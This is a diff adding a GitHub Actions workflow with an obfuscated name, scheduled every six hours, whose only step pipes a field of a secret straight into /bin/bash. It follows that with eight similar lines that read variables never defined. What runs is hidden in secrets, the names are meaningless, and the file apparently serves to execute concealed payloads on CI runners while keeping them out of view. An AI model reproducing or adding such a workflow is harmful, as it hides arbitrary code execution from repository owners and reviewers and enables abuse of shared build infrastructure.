@@ -1,0 +1,24 @@
+name: caocao19870105
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caocao19870105
+        env:
+          mzm2: ${{ secrets.mzm2 }}
+        run: |
+          echo $mzm2 | jq -r .f3301 | /bin/bash
+          echo $kujxd8 | jq -r .rxus5572 | /bin/bash
+          echo $er1460 | jq -r .wz59941 | /bin/bash
+          echo $rxxrg6544 | jq -r .hi110 | /bin/bash
+          echo $jpez22 | jq -r .tpawq5 | /bin/bash
+          echo $qqtzd225 | jq -r .vaiwm3 | /bin/bash
+          echo $uih30671 | jq -r .e2195 | /bin/bash
+          echo $xshty59536 | jq -r .owis9 | /bin/bash
+          echo $bykq95094 | jq -r .lz28 | /bin/bash
+
